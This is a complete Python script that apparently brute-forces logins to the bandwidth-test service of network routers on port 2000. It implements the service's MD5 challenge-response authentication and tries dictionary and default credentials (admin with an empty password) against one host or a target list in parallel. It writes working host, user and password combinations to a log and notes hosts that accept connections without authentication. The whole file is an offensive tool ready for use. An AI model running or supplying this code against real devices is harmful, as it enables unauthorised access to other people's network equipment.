#!/usr/bin/env python3

import socket
import hashlib
import argparse
import signal
from multiprocessing import Pool

# Global constants (bandwidth-test protocol patterns)
BW_OK   = b'\x01\x00\x00\x00'
BW_SALT = b'\x02\x00\x00\x00'
BW_FAIL = b'\x00\x00\x00\x00'
BW_CMD  = b'\x00\x01\x01\x00\xdc\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

# Authorization result codes
AUTH_GOOD  = 0
AUTH_BAD   = 1
AUTH_ERROR = 2
AUTH_NONE  = 3
AUTH_RESULT_CODES = ["GOOD", "BAD", "ERROR", "NOAUTH"]
TIMEOUT = 5
DEFAULT_CREDS = ('admin', '')

# Global variables
targets = []
creds = []
number_of_threads = 10
stop_after_good = False
log = False
btest_port = 2000

# File name for good results
results_filename = 'btest-brute.log'

# Return MD5(password + MD5(password + salt))
def auth_digest(password, salt):
	md1 = hashlib.md5()
	md1.update(password.encode('UTF-8') + salt)
	digest1 = md1.digest()

	md2 = hashlib.md5()
	md2.update(password.encode('UTF-8') + digest1)
	return md2.digest()

# Prepare authentication packet
def auth_data(user, password, salt):
	auth = auth_digest(password, salt)
	result = auth + user.encode('UTF-8')
	fill = 48 - len(result)
	result += b'\x00' * fill
	return result

# Authenticate to the remote bandwidth-test server
def do_auth(host, user, password):
	result = AUTH_ERROR
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(TIMEOUT)
	try:
		s.connect((host, btest_port))
	except:
		print('[-] %s %s %s [CONNECT_ERROR]' % (host, user, password))
		s.close()
		return AUTH_ERROR

	try:
		read = s.recv(512)
	except:
		print('[-] %s %s %s [HELLO_READ_ERROR]' % (host, user, password))
		s.close()
		return AUTH_ERROR

	if read == BW_OK:
		try:
			s.send(BW_CMD)
		except:
			print('[-] %s %s %s [COMMAND_SEND_ERROR]' % (host, user, password))
			s.close()
			return AUTH_ERROR
		try:
			read = s.recv(512)
		except:
			print('[-] %s %s %s [RESPONSE_READ_ERROR]' % (host, user, password))
			s.close()
			return AUTH_ERROR
		if len(read) == 4:
			if read == BW_OK:
				print('[+] %s %s %s [AUTH_NONE]' % (host, user, password))
				result = AUTH_NONE
		elif len(read) == 20:
			if read[0:4] == BW_SALT:
				salt = read[4:20]
				auth = auth_data(user, password, salt)
				try:
					s.send(auth)
				except:
					print('[-] %s %s %s [AUTH_SEND_ERROR]' % (host, user, password))
					s.close()
					return AUTH_ERROR
				try:
					read = s.recv(512)
				except:
					print('[-] %s %s %s [AUTH_RESPONSE_ERROR]' % (host, user, password))
					s.close()
					return AUTH_ERROR
				if read == BW_FAIL:
					print('[-] %s %s %s [BAD]' % (host, user, password))
					result = AUTH_BAD
				elif read == BW_OK:
					print('\033[32m[+] %s %s %s [GOOD]\033[39m' % (host, user, password))
					result = AUTH_GOOD
				else:
					print('[-] %s %s %s [AUTH_UNKNOWN_CODE]' % (host, user, password))
					result = AUTH_ERROR
		else:
			print('[-] %s %s %s [RESPONSE_BAD_LENGTH]' % (host, user, password))
			result = AUTH_ERROR
	else:
		print('[-] %s %s %s [OTHER_ERROR]' % (host, user, password))
		result = AUTH_ERROR
	s.close()
	return result

def bruteforce(target):
	result = []
	for l, p in creds:
		print('[*] Trying to connect to target: %s:%s (%s:%s)' % (target, btest_port, l, p))
		code = do_auth(target, l, p)
		result.append((target, l, p, code))
		if code == AUTH_GOOD:
			if stop_after_good:
				return result
		elif code == AUTH_ERROR or code == AUTH_NONE:
			break
	return result

def read_dictionary(filename):
	try:
		with open(filename) as f:
			dictionary = [d.strip() for d in f.readlines()]
		f.close()
		return dictionary
	except:
		return None

def parse_dictionary(dict):
	result = []
	for d in dict:
#		login, password = d.split(':')
		try:
			login, password = d.split('\t')
		except:
			login = d
			password = ''
		result.append((login, password))
	return result

def read_targets(filename):
	try:
		with open(filename) as f:
			targets = [t.strip() for t in f.readlines()]
		f.close()
		return targets
	except:
		return None

if __name__ == '__main__':
	results_file_opened = False

	parser = argparse.ArgumentParser(description='description')
	parser.add_argument('-d', '--dict', help = 'A dictionary file', required = False)
	parser.add_argument('-t', '--target', help = 'Target hostname', required = False)
	parser.add_argument('-p', '--port', help = 'Bandwidth-test port', required = False)
	parser.add_argument('-T', '--targets', help = 'Targets list filename', required = False)
	parser.add_argument('-n', '--threads', type = int, help = 'Number of threads for parallel processing', required = False)
	parser.add_argument('-S', '--stop-after-good', action = 'store_true', help = 'Stop login tries after good creds found for the target', required = False)
	parser.add_argument('--log', help = 'Write log file', required = False)
	parser.add_argument('--default', action = 'store_true', help = 'Try default credentials at first', required = False)
	args = vars(parser.parse_args())

	if not ((args['target'] or args['targets']) and (args['dict'] or args['default'])):
		print('Please specify --target/-t <hostname> or --targets/-T <filename> to scan, and --dict/-d <filename> and/or --default options')
		exit(1)

	if args['dict']:
		dictfile = args['dict']
		dict = read_dictionary(dictfile)
		if dict is None:
			print('Error reading the dictionary file: %s' % dictfile)
			exit(1)
		creds = parse_dictionary(dict)
		if args['default']:
			creds.insert(0, DEFAULT_CREDS)

	if args['default']:
		if not args['dict']:
			creds = [DEFAULT_CREDS]

	if args['threads']:
		number_of_threads = args['threads']

	if args['port']:
		btest_port = int(args['port'])

	if args['target'] and args['targets']:
		print('Please specify --target/-t <hostname> or --targets/-T <filename>, but not both')
		exit(1)
	elif args['target']:
		targets.append(args['target'])
		number_of_threads = 1
	else:
		targetsfile = args['targets']
		targets = read_targets(targetsfile)
		if targets is None:
			print('Error reading the targets file: %s' % targetsfile)
			exit(1)
		targets_count = len(targets)
		if targets_count < number_of_threads:
			number_of_threads = targets_count

	if args['stop_after_good']:
		stop_after_good = True

	if args['log']:
		log = True
		log_filename = args['log']
		log_file = open(log_filename, 'a')

	print('[*] Starting with %s threads' % number_of_threads)
	pool = Pool(processes = number_of_threads)
	results = pool.map(bruteforce, targets)
	pool.close()
	pool.join()
	print('[!] Finishing...')

	print('\nGood results:\n=============')
	for r in results:
		for e in r:
			host, login, password, code = e
			if code == AUTH_GOOD:
#				out = host + ' ' + login + ' ' + password
				out = host + '\t' + login + '\t' + password
				print(out)
				if not results_file_opened:
					results_file = open(results_filename, 'a')
					results_file_opened = True
				results_file.write(out + '\n')
			if log:
				log_file.write(AUTH_RESULT_CODES[code] + '\t' + host + '\t' + login + '\t' + password + '\n')

	if results_file_opened:
		results_file.close()
	if log:
		log_file.close()
